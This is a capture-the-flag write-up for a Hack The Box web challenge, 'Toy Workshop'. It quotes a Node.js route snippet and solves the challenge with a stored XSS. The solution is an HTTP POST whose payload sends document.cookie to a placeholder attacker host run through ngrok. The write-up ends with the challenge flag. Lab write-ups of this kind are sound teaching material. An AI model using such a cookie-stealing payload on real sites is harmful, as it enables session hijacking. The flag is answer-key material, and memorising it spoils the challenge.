# Web 

## Toy Workshop

![image](https://user-images.githubusercontent.com/56447720/144388010-0a52a976-2014-4052-888c-cce6d567d3cd.png)

#### Homepage

![image](https://user-images.githubusercontent.com/56447720/144388506-ffff4770-6e36-4561-ab45-2d248bae31ae.png)

- The homepage had nothing intresting

#### Source Code

- `/web_toy_workshop/challenge/routes/index.js`

```js
<--SNIPPED-->

router.post('/api/submit', async (req, res) => {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() => {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

<--SNIPPED-->                    

```
- So we have to send our query ( json data ) in `/api/submit` 
- It's a XXS

#### Solution

```js
POST /api/submit HTTP/1.1
Host: 46.101.20.5:31726
Content-Type:application/json
Content-Length: 130

{
  "query":"<img src=x onerror=this.src='<IP>/c?'+document.cookie;>"
}

```
- I used python3 http server with ngrok ( appended the link in <IP> )

#### Flag 
  
- After you sent the the POST request to the website, It will use the query and store it in it's database, and retrive the flag ( cookie ) for us

- Start the python3 server , use ngrok , update the query
  
![image](https://user-images.githubusercontent.com/56447720/144390423-6ef82ec3-5eaa-4383-b371-eb8c713049e5.png)

 
```bash
# flag : HTB{3v1l_3lv3s_4r3_r1s1ng_up!}
```
